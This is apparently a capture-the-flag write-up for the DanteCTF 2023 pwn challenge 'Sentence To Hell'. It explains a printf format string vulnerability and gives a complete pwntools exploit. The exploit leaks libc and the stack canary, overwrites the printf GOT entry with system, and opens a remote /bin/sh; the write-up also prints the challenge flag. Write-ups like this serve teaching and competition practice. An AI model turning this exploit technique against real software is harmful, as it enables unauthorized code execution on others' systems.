---
title: "Sentence To Hell"
ctf: "DanteCTF 2023"
date: 2023-06-04
category: pwn
difficulty: medium
points: 350
flag_format: "DANTE{...}"
author: "Antigravity Team"
---

# Sentence To Hell

## Summary

**Sentence To Hell** is a Pwn challenge featuring a Format String Vulnerability combined with a controlled arbitrary write primitive. By leaking `libc` base and stack canary addresses, we overwrite the return address or Global Offset Table (GOT) entry to hijack execution flow to `system("/bin/sh")`.

---

## Technical Details & Vulnerability Analysis

1. **Format String Vulnerability**:
   The binary reads user input into a stack buffer and prints it directly using `printf(buffer)` without format specifiers:
   ```c
   char buffer[256];
   fgets(buffer, sizeof(buffer), stdin);
   printf(buffer); // Vulnerable to Format String Attack
   ```

2. **Exploitation Strategy**:
   - **Step 1 (Leak)**: Use `%p` format specifiers (e.g. `%3$p`, `%11$p`) to leak a `libc` pointer and the stack canary.
   - **Step 2 (Arbitrary Write)**: Calculate `libc` base address and the address of `system()`. Use positional `%n` / `%hn` format specifiers to overwrite a target pointer or GOT entry.
   - **Step 3 (Shell)**: Trigger the overwritten pointer to spawn `/bin/sh`.

---

## Exploit Script (Pwntools)

```python
from pwn import *

# Load binary and libc
elf = ELF("./sentence_to_hell")
libc = ELF("./libc.so.6")

# io = process("./sentence_to_hell")
io = remote("sentence-to-hell.dantectf.it", 31337)

# Step 1: Leak libc and canary via format string
io.sendlineafter(b"Enter your sentence: ", b"%3$p.%11$p")
leak = io.recvline().decode().strip().split(".")
libc_leak = int(leak[0], 16)
canary = int(leak[1], 16)

libc.address = libc_leak - 0x114a37 # Adjusted offset
log.info(f"Libc Base: {hex(libc.address)}")
log.info(f"Canary: {hex(canary)}")

# Step 2: Craft payload to overwrite GOT entry of printf with system
payload = fmtstr_payload(6, {elf.got['printf']: libc.symbols['system']})
io.sendline(payload)

# Step 3: Trigger system('/bin/sh')
io.sendline(b"/bin/sh")
io.interactive()
```

---

## Flag

```
DANTE{f0rm4t_str1ng_t0_h3ll_sh3ll}
```
